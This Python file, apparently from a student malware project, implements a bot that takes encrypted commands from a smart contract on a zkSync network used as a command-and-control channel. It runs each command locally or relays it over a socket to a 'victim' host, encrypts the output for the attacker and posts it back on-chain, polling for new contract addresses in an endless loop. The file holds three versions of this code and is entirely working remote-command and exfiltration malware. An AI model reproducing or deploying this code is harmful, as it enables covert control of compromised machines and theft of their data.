'''
import os
import json
import base64
import random
import subprocess
from web3 import Web3
from nacl.public import PrivateKey, PublicKey, Box
from dotenv import load_dotenv

load_dotenv()

BOT_PRIVATE_KEY = os.getenv("BOT_PRIVATE_KEY")
RPC_URL = os.getenv("RPC_URL", "http://localhost:3050")
CONTRACT_ADDRESS = os.getenv("CURRENT_C2_ADDRESS")

if not Web3.is_address(CONTRACT_ADDRESS):
    raise ValueError(f"Invalid contract address: {CONTRACT_ADDRESS}")

# Load ABI
with open("artifacts-zk/contracts/EphemeralC2.sol/EphemeralC2.json") as f:
    abi = json.load(f)["abi"]

# Connect to zkSync local node
w3 = Web3(Web3.HTTPProvider(RPC_URL))
chain_id = w3.eth.chain_id
print(f"[*] Connected to zkSync network (chain ID: {chain_id})")

# Create ephemeral wallet
ephemeral_wallet = w3.eth.account.create()
w3.eth.default_account = ephemeral_wallet.address
print(f"[*] Created ephemeral wallet: {ephemeral_wallet.address}")

# Load rich wallets
with open("/home/alishba/Documents/uni/sem4/malware/project/local-setup/rich-wallets.json", "r") as f:
    wallets = json.load(f)

def get_funded_wallet(wallets):
    for wallet in wallets:
        acct = w3.eth.account.from_key(wallet["privateKey"])
        balance = w3.eth.get_balance(acct.address)
        if balance > w3.to_wei(0.011, "ether"):  # buffer for zkSync fees
            print(f"[DEBUG] Using rich wallet: {acct.address} ({w3.from_wei(balance, 'ether')} ETH)")
            return acct
    raise Exception("No rich wallet with sufficient funds found.")

rich_acct = get_funded_wallet(wallets)

# Fund ephemeral wallet
tx = {
    'to': ephemeral_wallet.address,
    'value': w3.to_wei(0.1, 'ether'),
    'gas': 500000,
    'gasPrice': w3.eth.gas_price,
    'nonce': w3.eth.get_transaction_count(rich_acct.address),
    'chainId': chain_id,
}
signed_tx = rich_acct.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
print(f"[+] Funded ephemeral wallet (tx: {tx_hash.hex()})")

# Wait for the transaction to be mined (zkSync can be async, but local is fast)
w3.eth.wait_for_transaction_receipt(tx_hash)

# Connect to contract
contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=abi)
print("[*] Fetching encrypted command from C2...")
payload = contract.functions.getCommand().call()

# Decrypt command
payload = json.loads(payload)
epk = base64.b64decode(payload["epk"])
nonce = base64.b64decode(payload["nonce"])
ciphertext = base64.b64decode(payload["ciphertext"])
box = Box(PrivateKey(base64.b64decode(BOT_PRIVATE_KEY)), PublicKey(epk))
command = box.decrypt(ciphertext, nonce).decode()
print("[+] Command received:", command)

# Execute command
try:
    output = subprocess.getoutput(command)
except Exception as e:
    output = f"[!] Command failed: {str(e)}"

# Log balance before submitting output
balance = w3.eth.get_balance(ephemeral_wallet.address)
print(f"[DEBUG] Ephemeral wallet balance: {w3.from_wei(balance, 'ether')} ETH")

# Submit output to contract
submit_tx = contract.functions.submitOutput(output).build_transaction({
    "from": ephemeral_wallet.address,
    "nonce": w3.eth.get_transaction_count(ephemeral_wallet.address),
    "gas": 500000,
    "gasPrice": w3.eth.gas_price,
    "chainId": chain_id
})
signed = ephemeral_wallet.sign_transaction(submit_tx)
submit_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
print(f"[+] Output submitted (tx: {submit_hash.hex()})")
'''
# import os
# import json
# import base64
# import random
# import time
# import subprocess
# from web3 import Web3
# from nacl.public import PrivateKey, PublicKey, Box
# from dotenv import load_dotenv

# def load_contract_address():
#     load_dotenv(override=True)  # <-- force reload
#     return os.getenv("CURRENT_C2_ADDRESS")


# def load_contract(w3, address, abi):
#     if not Web3.is_address(address):
#         raise ValueError(f"Invalid contract address: {address}")
#     return w3.eth.contract(address=address, abi=abi)

# def get_funded_wallet(w3, wallets):
#     for wallet in wallets:
#         acct = w3.eth.account.from_key(wallet["privateKey"])
#         balance = w3.eth.get_balance(acct.address)
#         if balance > w3.to_wei(0.011, "ether"):
#             print(f"[DEBUG] Using rich wallet: {acct.address} ({w3.from_wei(balance, 'ether')} ETH)")
#             return acct
#     raise Exception("No rich wallet with sufficient funds found.")

# def fund_ephemeral_wallet(w3, from_acct, to_acct, chain_id):
#     tx = {
#         'to': to_acct.address,
#         'value': w3.to_wei(0.1, 'ether'),
#         'gas': 500000,
#         'gasPrice': w3.eth.gas_price,
#         'nonce': w3.eth.get_transaction_count(from_acct.address),
#         'chainId': chain_id,
#     }
#     signed_tx = from_acct.sign_transaction(tx)
#     tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
#     print(f"[+] Funded ephemeral wallet (tx: {tx_hash.hex()})")
#     w3.eth.wait_for_transaction_receipt(tx_hash)

# def execute_command_flow(w3, contract, ephemeral_wallet, bot_private_key):
#     print("[*] Fetching encrypted command from C2...")
#     payload = contract.functions.getCommand().call()
#     payload = json.loads(payload)

#     epk = base64.b64decode(payload["epk"])
#     nonce = base64.b64decode(payload["nonce"])
#     ciphertext = base64.b64decode(payload["ciphertext"])

#     box = Box(PrivateKey(base64.b64decode(bot_private_key)), PublicKey(epk))
#     command = box.decrypt(ciphertext, nonce).decode()
#     print("[+] Command received:", command)

#     def forward_to_victim(command):
#     HOST = "192.168.226.128"  # or "127.0.0.1" if local
#     PORT = 9999
#     try:
#         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#             s.connect((HOST, PORT))
#             s.sendall(command.encode())
#             result = s.recv(4096).decode()
#             return result
#     except Exception as e:
#         return f"[!] Could not reach victim: {e}"
    
#     output = forward_to_victim(command)



#     balance = w3.eth.get_balance(ephemeral_wallet.address)
#     print(f"[DEBUG] Ephemeral wallet balance: {w3.from_wei(balance, 'ether')} ETH")

#     tx = contract.functions.submitOutput(output).build_transaction({
#         "from": ephemeral_wallet.address,
#         "nonce": w3.eth.get_transaction_count(ephemeral_wallet.address),
#         "gas": 500000,
#         "gasPrice": w3.eth.gas_price,
#         "chainId": w3.eth.chain_id
#     })
#     signed = ephemeral_wallet.sign_transaction(tx)
#     tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
#     print(f"[+] Output submitted (tx: {tx_hash.hex()})")

# def main():
#     load_dotenv()
#     bot_private_key = os.getenv("BOT_PRIVATE_KEY")
#     rpc_url = os.getenv("RPC_URL", "http://localhost:3050")

#     with open("artifacts-zk/contracts/EphemeralC2.sol/EphemeralC2.json") as f:
#         abi = json.load(f)["abi"]

#     w3 = Web3(Web3.HTTPProvider(rpc_url))
#     print(f"[*] Connected to zkSync network (chain ID: {w3.eth.chain_id})")

#     # Ephemeral wallet
#     ephemeral_wallet = w3.eth.account.create()
#     w3.eth.default_account = ephemeral_wallet.address
#     print(f"[*] Created ephemeral wallet: {ephemeral_wallet.address}")

#     # Rich wallet
#     with open("/home/alishba/Documents/uni/sem4/malware/project/local-setup/rich-wallets.json", "r") as f:
#         wallets = json.load(f)
#     rich_acct = get_funded_wallet(w3, wallets)

#     fund_ephemeral_wallet(w3, rich_acct, ephemeral_wallet, w3.eth.chain_id)

#     # First load
#     last_seen_contract_address = load_contract_address()
#     contract = load_contract(w3, last_seen_contract_address, abi)
#     execute_command_flow(w3, contract, ephemeral_wallet, bot_private_key)

#     # Loop forever
#     while True:
#         time.sleep(30)
#         new_address = load_contract_address()
#         if new_address != last_seen_contract_address:
#             print(f"[+] New contract address detected: {new_address}")
#             last_seen_contract_address = new_address
#             contract = load_contract(w3, new_address, abi)
#             execute_command_flow(w3, contract, ephemeral_wallet, bot_private_key)
#         else:
#             print("[*] No new command. Waiting...")

# if __name__ == "__main__":
#     main()

import os
import json
import base64
import time
import socket
from web3 import Web3
from nacl.public import PrivateKey, PublicKey, Box
from dotenv import load_dotenv
import subprocess


def load_contract_address():
    load_dotenv(override=True)
    return os.getenv("CURRENT_C2_ADDRESS")


def load_contract(w3, address, abi):
    if not Web3.is_address(address):
        raise ValueError(f"Invalid contract address: {address}")
    return w3.eth.contract(address=address, abi=abi)


def get_funded_wallet(w3, wallets):
    for wallet in wallets:
        acct = w3.eth.account.from_key(wallet["privateKey"])
        balance = w3.eth.get_balance(acct.address)
        if balance > w3.to_wei(0.011, "ether"):
            print(f"[DEBUG] Using rich wallet: {acct.address} ({w3.from_wei(balance, 'ether')} ETH)")
            return acct
    raise Exception("No rich wallet with sufficient funds found.")


def fund_ephemeral_wallet(w3, from_acct, to_acct, chain_id):
    tx = {
        'to': to_acct.address,
        'value': w3.to_wei(0.1, 'ether'),
        'gas': 500000,
        'gasPrice': w3.eth.gas_price,
        'nonce': w3.eth.get_transaction_count(from_acct.address),
        'chainId': chain_id,
    }
    signed_tx = from_acct.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"[+] Funded ephemeral wallet (tx: {tx_hash.hex()})")
    w3.eth.wait_for_transaction_receipt(tx_hash)


def forward_to_victim(command):
    HOST = "192.168.226.128"
    PORT = 9999
    try:
        print(f"[>] Connecting to victim at {HOST}:{PORT}")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(command.encode())
            result = s.recv(65535).decode()
            print("[<] Response from victim:", result)
            return result
    except Exception as e:
        error_msg = f"[!] Could not reach victim: {e}"
        print(error_msg)
        return error_msg


def execute_command_flow(w3, contract, ephemeral_wallet, bot_private_key):
    print("[*] Fetching encrypted command from C2...")
    payload = contract.functions.getCommand().call()
    payload = json.loads(payload)

    epk = base64.b64decode(payload["epk"])
    nonce = base64.b64decode(payload["nonce"])
    ciphertext = base64.b64decode(payload["ciphertext"])

    box = Box(PrivateKey(base64.b64decode(bot_private_key)), PublicKey(epk))
    command = box.decrypt(ciphertext, nonce).decode()
    print("[+] Command received:", command)

    # Forward command to victim and get output
    output = forward_to_victim(command)

    # Encrypt the output using attacker's public key
    attacker_pubkey_b64 = os.getenv("C2_PUBLIC_KEY")
    if not attacker_pubkey_b64:
        raise ValueError("C2_PUBLIC_KEY not found in .env")

    attacker_pubkey = PublicKey(base64.b64decode(attacker_pubkey_b64))
    ephemeral_key = PrivateKey.generate()
    box = Box(ephemeral_key, attacker_pubkey)

    nonce = os.urandom(24)
    encrypted = box.encrypt(output.encode(), nonce)

    encrypted_payload = {
        "epk": base64.b64encode(bytes(ephemeral_key.public_key)).decode(),
        "nonce": base64.b64encode(nonce).decode(),
        "ciphertext": base64.b64encode(encrypted.ciphertext).decode()
    }

    encrypted_output_json = json.dumps(encrypted_payload)

    # Submit encrypted output to the contract
    balance = w3.eth.get_balance(ephemeral_wallet.address)
    print(f"[DEBUG] Ephemeral wallet balance: {w3.from_wei(balance, 'ether')} ETH")

    tx = contract.functions.submitOutput(encrypted_output_json).build_transaction({
        "from": ephemeral_wallet.address,
        "nonce": w3.eth.get_transaction_count(ephemeral_wallet.address),
        "gas": 500000,
        "gasPrice": w3.eth.gas_price,
        "chainId": w3.eth.chain_id
    })
    signed = ephemeral_wallet.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"[+] Encrypted output submitted (tx: {tx_hash.hex()})")


def main():
    load_dotenv()
    bot_private_key = os.getenv("BOT_PRIVATE_KEY")
    rpc_url = os.getenv("RPC_URL", "http://localhost:3050")

    with open("artifacts-zk/contracts/EphemeralC2.sol/EphemeralC2.json") as f:
        abi = json.load(f)["abi"]

    w3 = Web3(Web3.HTTPProvider(rpc_url))
    print(f"[*] Connected to zkSync network (chain ID: {w3.eth.chain_id})")

    ephemeral_wallet = w3.eth.account.create()
    w3.eth.default_account = ephemeral_wallet.address
    print(f"[*] Created ephemeral wallet: {ephemeral_wallet.address}")

    with open("/home/alishba/Documents/uni/sem4/malware/project/local-setup/rich-wallets.json", "r") as f:
        wallets = json.load(f)
    rich_acct = get_funded_wallet(w3, wallets)

    fund_ephemeral_wallet(w3, rich_acct, ephemeral_wallet, w3.eth.chain_id)

    last_seen_contract_address = load_contract_address()
    contract = load_contract(w3, last_seen_contract_address, abi)
    execute_command_flow(w3, contract, ephemeral_wallet, bot_private_key)

    while True:
        time.sleep(30)
        new_address = load_contract_address()
        if new_address != last_seen_contract_address:
            print(f"[+] New contract address detected: {new_address}")
            last_seen_contract_address = new_address
            contract = load_contract(w3, new_address, abi)
            execute_command_flow(w3, contract, ephemeral_wallet, bot_private_key)
        else:
            print("[*] No new command. Waiting...")


if __name__ == "__main__":
    main()
